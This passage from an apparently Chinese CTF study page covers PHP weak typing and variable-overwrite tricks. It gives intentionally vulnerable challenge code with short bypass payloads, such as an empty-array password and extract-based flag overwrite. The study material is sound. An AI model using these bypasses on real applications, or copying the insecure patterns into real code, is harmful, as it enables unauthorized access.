class="token operator">=</span> <span class="token string">"3name"</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//switch 的比较是使用双等于号。此处如果传入值为字符串，那么会转化为数值</span>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">echo</span> <span class="token string">"this is two"</span> <span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">echo</span> <span class="token string">"flag"</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span>flag</code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//使用strcmp进行比较</span><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Right! ! !login success"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"Wrong password..."</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//直接传入一个空数组</span><span class="token comment" spellcheck="true">//payload ： password[]=</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token variable">$array</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//'abc'被识别为0</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token string">'1bc'</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">//'1bc'被识别为1</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//数字3等于字符串3</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//bool(true) bool(true) bool(true)</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">'1bc'</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">array_search</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//int(0)  int(1)  int(3)  int(3)</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$test</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"error"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">// ===是强类型</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"false"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//此处应该利用 arrary_search的弱类型比较（array_search如果没有设置strict，就是弱类型比较），字符串与0相等</span><span class="token comment" spellcheck="true">//payload ： test[]=0</span></code></pre><h4 id="2-变量覆盖"><a href="#2-变量覆盖" class="headerlink" title="2.变量覆盖"></a>2.变量覆盖</h4><ul><li><code>extract()</code>：从数组中将变量导入到当前的符号变量表，返回值为int，如果该函数没有设置后面的参数，可能会导致后面的变量覆盖</li><li><code>$$</code>：引用变量</li><li><code>parse_str</code>：将字符串解析成多个变量</li><li>曾经存在的问题： <code>import_request_variables</code>：php 4 &gt; 4.1.0  &amp;&amp; php 5 &lt; 5.4.0 <ul><li>将get post cookie 变量导入到全局作用域中</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$gift</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$gift</span> <span class="token operator">==</span> <span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$trueflag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'oh..'</span> <span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//直接传入 gift 和 flag  相等，通过变量覆盖flag</span><span class="token comment" spellcheck="true">//payload ： gift=&amp;flag=</span><span class="token comment" spellcheck="true">//因为file_get_content 是用来读文件的，所以flag不能传入字符串等其他值，直接传入空就好了</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span>”helloworld"<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$a"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>$<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$a"</span> <span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//如果传入a=123，那么123会把hello word覆盖 </span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$_403</span> <span class="token operator">=</span> <span class="token string">"Access Denied"</span> <span class="token punctuation">;</span><span class="token variable">$_200</span> <span class="token operator">=</span> <span class="token string">"Welcome Admin"</span> <span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span> <span class="token punctuation">[</span><span class="token string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"POST"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"BugsBunnyCTF is here :p..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$_403</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        $<span class="token variable">$key</span> <span class="token operator">=</span> $<span class="token variable">$value</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//此处键和值都是两个$$，所以传入的两个都是变量</span>    <span class="token punctuation">}</span>                                <span class="token comment" spellcheck="true">//变量赋值给变量，中间桥梁，</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//get传入  key=flag，通过遍历，此时真实的flag赋值给了key</span>    <span class="token punctuation">{</span>                                <span class="token comment" spellcheck="true">//在遍历post的时候，把key的值再传给我们post的flag</span>        $<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$flag</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$_403</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"This is your flag : "</span><span class="token punctuation">.</span><span class="token variable">$flag</span> <span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$_200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//也可以在get 传入 _200=flag，因为总要输出_200</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//该题思路就是利用遍历get的时候，提前将flag的值保存出来，避免post传入的flag把真实flag覆盖</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>            <span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'www.OPENCTF.com'</span><span class="token punctuation">;</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//此处通过id传入一个名字为a数组</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'QNKCDZO'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span>        <span class="token punctuation">{</span>                  <span class="token comment" spellcheck="true">//此处需要md5弱类型思路绕过，MD5的结果以0e开头即可</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span> <span class="token string">'其实很简单其实并不难! '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//payload ： id=a[0]=s878926199a</span><span class="token comment" spellcheck="true">//注意：该php文档中说，点和空格会被转化为下划线，所以某些时候可通过点和空格绕过下划线的匹配</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//仅试用于 php 4 > 4.1.0  &amp;&amp; php 5 &lt; 5.4.0 </span><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token string">'0'</span><span class="token punctuation">;</span><span class="token function">import_request_variables</span><span class="token punctuation">(</span><span class="token string">'G'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$auth</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"oh no"</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h4 id="3-空白符"><a href="#3-空白符" class="headerlink" title="3.空白符"></a>3.空白符</h4><ul><li><p><code>intval</code> ：获取变量的整数值（十进制）</p><ul><li><p>成功时返回int值，失败返回0，空数组返回0 ，非空数组返回1</p></li><li><p>32位系统最大带符号的integer范围是 -2147483648到2147483647</p></li><li><p>64位系统上，最大带符号的integer值是9223372036854775807。</p></li></ul></li></ul><pre class=" language-php"><code class="language-php">    <span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">// 42</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">4.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">// 4</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">'42'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 42</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">'+42'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 42</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">'-42'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// -42</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">042</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">// 34</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">'042'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 42</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">1e10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 10000000000</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">'1e10'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// 1</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">0x1A</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 26</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">42000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 42000000</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">420000000000000000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 0 超出上限，结果不一定为0，不确定</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">'420000000000000000000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 2147483647  该值不确定</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 42，后面加参数代表的是进制</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">'42'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">// 34</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">// 0</span>    <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 1</span>    <span class="token delimiter">?></span> </code></pre><ul><li><p><code>is_numeric()</code>：检测变量是否为数字或数字字符串</p><ul><li>该函数会自动<strong>跳过</strong>  <code>\t \n \r \v \f %20</code>等，即：如果变量包含以上字符，依然认为是数字，返回true</li></ul></li><li><p><code>trim</code>：会<strong>去除</strong>首尾的空白符和其他字符 <code>\t \n \r \v \x0B</code> \x0B是水平制表符</p></li><li><p>浮点数的精度：<code>1.01 != 1</code>  、 <code>1.0001 != 1</code> 、  <code>1.0000000000000001=1</code> </p></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span> <span class="token punctuation">;</span><span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_error"</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span>    <span class="token punctuation">(</span><span class="token string">"have a fun!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$global_var</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$global_var</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$value</span><span class="token operator">=</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">//trim 过滤首尾的字符</span>    <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$req</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//给特殊字符增加反斜线</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">is_palindrome_number</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//回文数验证</span>    <span class="token variable">$number</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token variable">$j</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$j</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$number</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_RRQUEST</span><span class="token punctuation">[</span><span class="token string">"number"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// \n\r\t\f\v等都会被自动跳过，所以使用%00</span><span class="token punctuation">{</span>    <span class="token variable">$info</span><span class="token operator">=</span><span class="token string">"sorry, you cann't input a number!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string">"number must be equal to it's integer!!"</span><span class="token 